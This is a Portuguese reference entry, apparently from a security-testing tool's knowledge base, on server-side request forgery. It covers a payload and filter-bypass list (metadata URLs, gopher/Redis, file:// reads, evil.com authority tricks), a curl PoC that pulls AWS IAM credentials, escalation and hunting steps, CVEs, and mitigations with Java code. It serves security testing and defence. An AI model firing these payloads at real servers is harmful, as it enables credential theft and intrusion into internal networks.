---
id: ssrf
title: "Server-Side Request Forgery"
module: "ssrf"
severity: "CRITICAL"
cwe_id: "CWE-918"
cwe_title: "Server-Side Request Forgery (SSRF)"
cvss_vector: "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N"
vrt_id: "server_security_misconfiguration.server_side_request_forgery"
---

## Summary
A aplicação busca uma URL controlada pelo usuário, permitindo que o atacante acesse serviços internos, metadata de cloud, arquivos locais e redes restritas a partir do servidor. É uma das falhas de maior impacto em ambientes cloud.

## Description
SSRF ocorre quando o servidor faz requisições HTTP/DNS com base em entrada do usuário sem validar destino, esquema e resolução. O atacante usa o servidor como proxy para alcançar:

- `localhost` e serviços administrativos internos (Redis, Elasticsearch, Docker, Actuator).
- Endpoints de metadata cloud (`169.254.169.254`, `metadata.google.internal`, `100.100.100.200`).
- Redes privadas (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`, `::1`, `fc00::/7`).
- Arquivos locais via `file://`, wrappers e protocolos alternativos.
- Serviços internos sem autenticação que permitem RCE (Redis, Docker API, memcached).

Mesmo SSRF "cego" (sem resposta refletida) pode ser confirmado com DNS/HTTP out-of-band, temporização ou mudanças de estado. Em cloud, a combinação com IMDSv1 pode levar ao roubo de credenciais IAM e comprometimento total da conta.

## Impact
- Roubo de credenciais cloud (AWS/GCP/Azure) e acesso a buckets, bancos e serviços.
- Acesso e modificação de dados internos, bypass de firewalls e segmentação.
- RCE via serviços internos (Redis, Docker, Jenkins, Actuator, Consul).
- Leitura de arquivos locais e segredos de configuração.
- Movimento lateral e escalada para comprometimento total do ambiente.
- Impacto CRITICAL; SSRF cego também pode ser crítico quando atinge metadata.

## Payloads and Bypasses
```text
# Localhost e loopback
http://127.0.0.1
http://127.0.0.1:80
http://localhost
http://localhost:8080
http://[::1]
http://[::ffff:127.0.0.1]
http://127.1
http://0.0.0.0

# Representações alternativas de IP
http://2130706433          # decimal
http://0177.0.0.1          # octal
http://0x7f000001          # hex
http://0x7f.0x0.0x0.0x1
http://127.0.0.1.nip.io
http://127.0.0.1.sslip.io
http://localtest.me

# Metadata cloud
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://100.100.100.200/latest/meta-data/
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Protocolos e wrappers
file:///etc/passwd
file:///proc/self/environ
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:11211/stat
ftp://127.0.0.1/
ldap://127.0.0.1/
```

Bypasses de filtros e WAF:
```text
# Userinfo / authority confusion
http://evil.com@127.0.0.1
http://127.0.0.1#@evil.com
http://127.0.0.1?@evil.com
http://alvo.com@169.254.169.254/

# Redirecionamento aberto como relay
http://alvo.com/redirect?url=http://169.254.169.254/
# Seguir redirects no servidor para burlar allowlist inicial

# DNS rebinding
http://rebind.attacker.com  # resolve para IP público na validação e 127.0.0.1 no fetch

# Encoding
http://127.0.0.1%2f@evil.com
http://%31%32%37.0.0.1
http://127.0.0.1%00.evil.com

# IPv6/IPv4 mapeado
http://[::ffff:7f00:1]
http://[0:0:0:0:0:ffff:127.0.0.1]

# Encurtadores e CDN
https://bit.ly/xxx
https://storage.googleapis.com/...  # redirect para metadata
```

PoC de exfiltração de credenciais AWS:
```bash
curl "https://alvo.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"
```

Casos reais e mentalidade de ataque (RWBH): Uber (fetch de imagens/avatares), Facebook (`og:image`) e Shopify (webhooks) lembram que qualquer URL controlada pode virar acesso a metadata e serviços internos; o atacante procura redirects e DNS rebinding quando a allowlist existe.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `url`, `uri`, `link`, `src`, `source`, `dest`, `destination`, `redirect`, `proxy`, `fetch`, `image`, `imageUrl`, `avatar`, `avatarUrl`, `callback`, `webhook`, `feed`, `host`, `port`, `path`, `file`, `load`, `import`, `site`, `html`, `u`, `rurl`, `preview`, `screenshot`, `pdf`, `export`.
- **Paths comuns:** `/api/fetch`, `/api/proxy`, `/api/image`, `/upload`, `/avatar`, `/webhook`, `/import`, `/preview`, `/screenshot`, `/render`, `/pdf`, `/integrations`, `/graphql`.
- **Sinais:** URL completa aceita; parâmetro `url` refletido em requisição server-side; funcionalidades de importação, preview, avatar, webhook, geração de PDF/screenshot; SSRF cego via DNS/HTTP OOB.

## Notable CVEs

| CVE | Produto | Ano | Descricao | Tipo |
|-----|---------|-----|-----------|------|
| CVE-2021-26855 | Microsoft Exchange Server | 2021 | ProxyLogon -- SSRF pre-auth via endpoint /owa/auth/x.js permite acessar mailboxes arbitrarias e pivotar para RCE | Pre-auth SSRF |
| CVE-2021-21975 | VMware vRealize Operations | 2021 | SSRF na API permite ator com acesso de rede ler dados internos sem autenticacao | Pre-auth SSRF |
| CVE-2021-21973 | VMware vCenter Server | 2021 | SSRF via validacao impr. de URLs em plugin do vSphere Client (porta 443) -- permite scan de rede interna | Pre-auth SSRF |
| CVE-2021-40438 | Apache HTTP Server (mod_proxy) | 2021 | URI crafted faz mod_proxy encaminhar request para origin server escolhido pelo atacante -- afeta <= 2.4.48 | Proxy SSRF |
| CVE-2022-22947 | Spring Cloud Gateway | 2022 | Code injection via Gateway Actuator endpoint exposto permite RCE e SSRF em versoes < 3.1.1+ e < 3.0.7+ | Actuator SSRF |
| CVE-2022-41040 | Microsoft Exchange Server | 2022 | ProxyNotShell -- SSRF autenticada combinada com CVE-2022-41082 para RCE; bypass do patch do ProxyLogon | Auth SSRF + RCE |
| CVE-2024-21893 | Ivanti Connect Secure / Policy Secure | 2024 | SSRF no componente SAML permite acessar recursos restritos sem autenticacao | SAML SSRF |
| CVE-2020-13379 | Grafana 3.0.1 -- 7.0.1 | 2020 | SSRF na feature de avatar permite qualquer usuario nao autenticado forcar Grafana a enviar HTTP requests para URLs arbitrarias | Avatar SSRF |
| CVE-2020-26258 | XStream < 1.4.15 | 2020 | SSRF ativada durante unmarshalling de XML -- permite leitura de recursos internos via desserializacao | Deserialization SSRF |
| CVE-2020-28168 | Axios NPM 0.21.0 | 2020 | Bypass de proxy via URL que responde com redirect para host restrito -- permite SSRF client-side | Redirect SSRF |

**Fontes**: CVE List v5 (cvelistV5), NVD, advisories dos vendors.

## Escalation Techniques
- **Roubo de credenciais cloud:** SSRF para `169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME` (AWS) exfiltra access key, secret key e session token. Em GCP, usar `metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token` (v1beta1 nao exige header `Metadata-Flavor`).
- **Port scanning e mapeamento de rede:** variar host (`10.0.0.1-255`) e porta (`22, 80, 443, 3306, 5432, 6379, 8080, 8443`) e observar diferencas em status code (200 vs 500) e tempo de resposta para inferir topologia interna e servicos ativos.
- **Bypass de controle de acesso:** usar o servidor como proxy para acessar paineis administrativos internos (`admin.example.com`, `internal-api.local`) que confiam no IP de origem.
- **RCE via servicos internos:** SSRF para Redis (`gopher://127.0.0.1:6379/_SET...`), Docker API (`http://127.0.0.1:2375/containers/create`), Consul, Jenkins, Actuator -- servicos que normalmente nao exigem auth na rede interna.
- **Exfiltracao via blind SSRF:** quando a resposta nao e refletida, usar DNS out-of-band (Collaborator, interact.sh) para confirmar conectividade, e inferir dados por timing e status codes.
- **Combinar com open redirect:** se a allowlist aceita subdomains do alvo, encontrar um redirect aberto nesse subdomain para pivotar para `127.0.0.1` ou metadata.

## Hunting Methodology
1. Identificar features que buscam recursos externos: webhooks, upload por URL, previews, screenshots, PDF generation, avatares, integracao com servicos externos, proxies.
2. Testar endpoints com URLs internas: `http://127.0.0.1`, `http://169.254.169.254/latest/meta-data/`, `http://[::1]`.
3. Para SSRF regular: observar se a resposta contem banners de servico, conteudo de paginas internas ou dados de metadata.
4. Para blind SSRF: usar servidor proprio (Netcat, Collaborator, interact.sh) e verificar se o alvo faz requisicoes outbound. Comparar status codes e tempos entre portas abertas e fechadas.
5. Se houver blocklist: tentar bypass via representacoes alternativas de IP (decimal `2130706433`, octal `0177.0.0.1`, hex `0x7f000001`), redirect via dominio controlado, DNS rebinding, IPv6 (`[::ffff:127.0.0.1]`).
6. Se houver allowlist: testar confusao de authority (`http://allowed.com@127.0.0.1`), regex fraco (`http://127.0.0.1/allowed.com`), e open redirects em dominios permitidos.
7. Verificar URLs embutidas em arquivos processados pela aplicacao (XML, PDF, SVG) -- podem triggerar SSRF indireta.

## False Positive Indicators
- Servidor retorna erro generico para qualquer URL invalida, nao apenas para ranges internos -- pode ser validacao de formato, nao SSRF.
- Requisicao DNS out-of-band e recebida mas sem HTTP follow-up -- indica que o servidor resolve DNS mas pode ter firewall de egress bloqueando conexoes.
- Resposta identica para `127.0.0.1` e para dominio publico invalido -- a aplicacao pode estar rejeitando todas as URLs sem busca-las.
- Funcionalidade de upload aceita URL mas processa client-side (JavaScript fetch) e nao server-side -- nao e SSRF.
- Aplicacao retorna conteudo da URL mas com cache CDN -- a resposta pode ser cache de requisicao anterior, nao fetch real do servidor.
- IMDSv2 ativo (requer token via PUT com hop limit) -- SSRF nao consegue obter o token, metadata retorna 401.

## Recommendation
1. Preferir allowlist de hosts, portas e esquemas necessários; nunca aceitar URL arbitrária.
2. Resolver o DNS no servidor, validar todos os IPs retornados e bloquear faixas privadas, loopback, link-local, multicast e metadata. Repetir a validação após cada redirect.
3. Desabilitar redirects automáticos ou limitar a mesma origem/allowlist; validar cada salto.
4. Fixar o IP resolvido (DNS pinning) e usar o IP validado na conexão, para evitar DNS rebinding.
5. Bloquear esquemas não HTTP(S) (`file`, `gopher`, `dict`, `ftp`, `ldap`, `jar`) e portas não necessárias.
6. Em cloud, exigir IMDSv2 (token obrigatório), restringir hop limit e aplicar least privilege nas roles.
7. Segmentar a rede: o serviço que faz fetch não deve alcançar o plano de controle, bancos ou metadata.
8. Usar proxy egress com allowlist, autenticação e logging; inspecionar respostas e limitar tamanho/tempo.
9. Exemplo Java:
```java
private static final Set<String> ALLOWED_HOSTS = Set.of("images.alvo.com", "cdn.alvo.com");

URI uri = URI.create(userUrl);
if (!"https".equalsIgnoreCase(uri.getScheme())) throw new IllegalArgumentException();
if (!ALLOWED_HOSTS.contains(uri.getHost())) throw new IllegalArgumentException();
InetAddress[] addrs = InetAddress.getAllByName(uri.getHost());
for (InetAddress a : addrs) {
    if (a.isLoopbackAddress() || a.isSiteLocalAddress() || a.isLinkLocalAddress()
        || a.isAnyLocalAddress() || a.isMulticastAddress()) {
        throw new IllegalArgumentException();
    }
}
HttpClient.newBuilder().followRedirects(HttpClient.Redirect.NEVER).build();
```
10. Monitorar requisições para metadata e ranges privados; alertar sobre tentativas.
